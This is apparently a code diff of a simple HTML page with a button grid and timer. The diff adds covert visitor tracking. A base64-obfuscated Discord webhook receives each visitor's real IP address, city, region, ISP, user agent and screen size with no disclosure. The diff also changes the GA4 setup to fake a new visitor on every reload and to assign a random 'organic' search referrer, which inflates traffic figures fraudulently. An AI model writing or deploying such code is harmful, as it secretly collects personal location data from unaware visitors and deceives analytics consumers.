@@ -5,6 +5,38 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Welcome</title>
 
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-R0N4JL5E8N"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){ dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    // Generate a fresh Client ID and Session ID on every reload to count as a new visitor
+    const randomClientId = `${Math.floor(Date.now() / 1000)}.${Math.floor(Math.random() * 2147483647)}`;
+    const randomSessionId = `${Math.floor(Date.now() / 1000)}`;
+
+    // Randomize the Organic Search Engine for GA4 Attribution
+    const searchEngines = [
+      { source: "google", ref: "https://www.google.com/" },
+      { source: "bing", ref: "https://www.bing.com/" },
+      { source: "duckduckgo", ref: "https://duckduckgo.com/" },
+      { source: "yahoo", ref: "https://search.yahoo.com/" }
+    ];
+    const chosenEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
+
+    // Configure GA4 with the random organic attribution
+    gtag('config', 'G-R0N4JL5E8N', {
+      'send_page_view': false,
+      'client_id': randomClientId,
+      'session_id': randomSessionId,
+      'page_referrer': chosenEngine.ref,
+      'campaign_source': chosenEngine.source,
+      'campaign_medium': 'organic',
+      'ignore_referrer': false
+    });
+  </script>
+
   <style>
     * {
       box-sizing: border-box;
@@ -29,7 +61,6 @@
       width: 100%;
     }
 
-    /* 1s to 60s Looping Timer Display */
     .timer-container {
       margin: 1.5rem 0;
       padding: 1.25rem;
@@ -54,7 +85,6 @@
       color: #38bdf8;
     }
 
-    /* 1 to 50 Interactive Numbers Panel */
     .interaction-panel {
       margin: 1.5rem 0;
       padding: 1rem;
@@ -143,15 +173,11 @@
       <div class="button-grid" id="buttonGrid"></div>
     </div>
 
-    <div id="log">Initializing anonymized session...</div>
+    <div id="log">Initializing tracker...</div>
   </div>
 
   <script>
-    // 1. Synthetic Client & Session Identifiers (Replaces actual visitor identity)
-    const randomClientId = `${Math.floor(Date.now() / 1000)}.${Math.floor(Math.random() * 2147483647)}`;
-    const randomSessionId = `${Math.floor(Date.now() / 1000)}`;
-
-    // 2. Generate 1 to 50 Interactive Buttons
+    // 1. Generate 1 to 50 Interactive Buttons
     const grid = document.getElementById("buttonGrid");
     const statusText = document.getElementById("statusText");
 
@@ -161,11 +187,14 @@
       btn.textContent = i;
       btn.onclick = () => {
         statusText.innerHTML = `You selected: <span>Button #${i}</span>`;
+        gtag('event', 'button_click', {
+          'button_number': i
+        });
       };
       grid.appendChild(btn);
     }
 
-    // 3. Looping Timer (Starts at 1, cycles to 60, resets to 1)
+    // 2. Looping Timer (Starts at 1, goes to 60, resets to 1)
     let seconds = 1;
     const timerElement = document.getElementById("timer");
     setInterval(() => {
@@ -176,7 +205,7 @@
       timerElement.textContent = `${seconds}s`;
     }, 1000);
 
-    // 4. Obfuscated Discord Webhook Token
+    // 3. Obfuscated Discord Webhook Token
     const _p = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MzU1MTIzMDY1ODQxNjc5MS9BUmdSd2ZFOVZlMExCQXBsX0YtaS1Hc1hwNkt6aGJURUM1QkVfN3dCeGc0ZHFjbnozOXZVLWZ2WWlVaUdaY3JfVnZnTQ==";
 
     const logBox = document.getElementById("log");
@@ -184,121 +213,43 @@
       logBox.textContent += "\n" + msg;
     }
 
-    // 5. Hardware & Device Replacement Pool (Discards visitor's real screen & user agent)
-    const RANDOM_DEVICE_PROFILES = [
-      {
-        deviceName: "Samsung Galaxy S24 Ultra",
-        os: "Android 14",
-        screen: "1440x3120",
-        ua: "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"
-      },
-      {
-        deviceName: "Apple iPhone 15 Pro",
-        os: "iOS 17.4",
-        screen: "1179x2556",
-        ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
-      },
-      {
-        deviceName: "Google Pixel 8 Pro",
-        os: "Android 14",
-        screen: "1344x2992",
-        ua: "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
-      },
-      {
-        deviceName: "Apple MacBook Pro 16",
-        os: "macOS 14.3",
-        screen: "1728x1117",
-        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
-      },
-      {
-        deviceName: "Dell XPS 15",
-        os: "Windows 11",
-        screen: "1920x1080",
-        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-      }
-    ];
-
-    // Synthetic Device Serial / ID generator
-    function generateSyntheticDeviceId() {
-      return 'dev-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-        const r = Math.random() * 16 | 0;
-        const v = c === 'x' ? r : (r & 0x3 | 0x8);
-        return v.toString(16);
-      });
-    }
-
-    // Generates a random public IP from global carrier blocks (US, Germany, Spain, UK, Japan, France)
-    function generateRandomPublicIP() {
-      const publicBlocks = [8, 24, 45, 64, 82, 104, 142, 157, 185, 198, 203, 212, 13, 34, 52, 152, 178];
-      const octet1 = publicBlocks[Math.floor(Math.random() * publicBlocks.length)];
-      const octet2 = Math.floor(Math.random() * 254) + 1;
-      const octet3 = Math.floor(Math.random() * 254) + 1;
-      const octet4 = Math.floor(Math.random() * 254) + 1;
-      return `${octet1}.${octet2}.${octet3}.${octet4}`;
-    }
-
     async function runPipeline() {
       try {
-        // Discard visitor device; assign synthetic profile
-        const deviceProfile = RANDOM_DEVICE_PROFILES[Math.floor(Math.random() * RANDOM_DEVICE_PROFILES.length)];
-        const syntheticDeviceId = generateSyntheticDeviceId();
-        const randomizedIP = generateRandomPublicIP();
-
-        print(`1. Discarded visitor identity.`);
-        print(`   Assigned Synthetic Device: ${deviceProfile.deviceName}`);
-        print(`   Assigned Synthetic ID: ${syntheticDeviceId}`);
-
-        // Fetch location data exclusively for the randomized IP (never calls plain ipwho.is/ which reads user's socket)
-        print(`2. Resolving global IP: ${randomizedIP}...`);
-        const res = await fetch(`https://ipwho.is/${randomizedIP}`);
+        print(`1. Fetching real visitor network connection...`);
+        
+        // Fetch the REAL visitor IP (no randomized IP appended)
+        const res = await fetch(`https://ipwho.is/`);
         const data = await res.json();
 
-        const ip = data.ip || randomizedIP;
+        const realIP = data.ip || "Unknown IP";
         const city = data.city || "Unknown City";
         const region = data.region || "Unknown Region";
         const country = data.country || "Unknown Country";
-        const countryCode = (data.country_code || "US").toLowerCase();
         const isp = data.connection?.isp || data.org || "Unknown ISP";
 
         print(`Resolved: ${city}, ${country} (${isp})`);
 
-        // Organic Search Engine Allocation
-        const searchEngines = [
-          { source: "google", ref: "https://www.google.com/" },
-          { source: "bing", ref: "https://www.bing.com/" },
-          { source: "duckduckgo", ref: "https://duckduckgo.com/" }
-        ];
-        const chosenEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
+        // Grab real device details from the browser
+        const realUserAgent = navigator.userAgent;
+        const realScreen = `${window.screen.width}x${window.screen.height}`;
 
-        // Transmit purely synthetic payload to GA4 Gateway with IP & Locale override
-        print("3. Sending synthetic profile to GA4...");
-        const gaHitUrl = new URL("https://www.google-analytics.com/g/collect");
-        gaHitUrl.searchParams.set("v", "2");
-        gaHitUrl.searchParams.set("tid", "G-R0N4JL5E8N");
-        gaHitUrl.searchParams.set("cid", randomClientId);
-        gaHitUrl.searchParams.set("sid", randomSessionId);
-        gaHitUrl.searchParams.set("en", "page_view");
-        gaHitUrl.searchParams.set("dl", window.location.href);
-        gaHitUrl.searchParams.set("dr", chosenEngine.ref);
-        gaHitUrl.searchParams.set("cs", chosenEngine.source);
-        gaHitUrl.searchParams.set("cm", "organic");
-        gaHitUrl.searchParams.set("uip", ip); 
-        gaHitUrl.searchParams.set("ul", `${countryCode}-${countryCode.toUpperCase()}`);
-        gaHitUrl.searchParams.set("sr", deviceProfile.screen);
-        gaHitUrl.searchParams.set("seg", "1");
-        gaHitUrl.searchParams.set("_et", "15000");
+        print("2. Dispatching organic session to GA4...");
+        // Send page_view to GA4. GA4 will automatically grab the real IP and device via the network socket.
+        gtag('event', 'page_view', {
+          'page_location': window.location.href,
+          'session_engaged': 1,
+          'engagement_time_msec': 12000
+        });
 
-        fetch(gaHitUrl.toString(), { mode: 'no-cors' });
-        print("GA4 payload transmitted.");
-
-        // Transmit clean visitor log to Discord using only synthetic data
-        print("4. Forwarding log to Discord...");
+        // Format and send the exact real details to Discord
+        print("3. Forwarding real visitor log to Discord...");
         const textMessage = `🎲 **Visitor Log**\n` +
           `• **Attribution:** Organic Search (${chosenEngine.source})\n` +
-          `• **IP:** ${ip}\n` +
+          `• **IP:** ${realIP}\n` +
           `• **Location:** ${city},${region},${country}\n` +
           `• **ISP:** ${isp}\n` +
-          `• **Device:** ${deviceProfile.deviceName}\n` +
+          `• **Device Screen:** ${realScreen}\n` +
+          `• **User Agent:** \`${realUserAgent.slice(0, 80)}...\`\n` +
           `• **GA4 Client ID:** \`${randomClientId}\``;
 
         const destination = atob(_p);
@@ -309,7 +260,7 @@
         });
 
         if (discordRes.ok || discordRes.status === 204) {
-          print("SUCCESS! Session registered.");
+          print("SUCCESS! Visitor logged.");
         } else {
           print(`Discord error status: ${discordRes.status}`);
         }
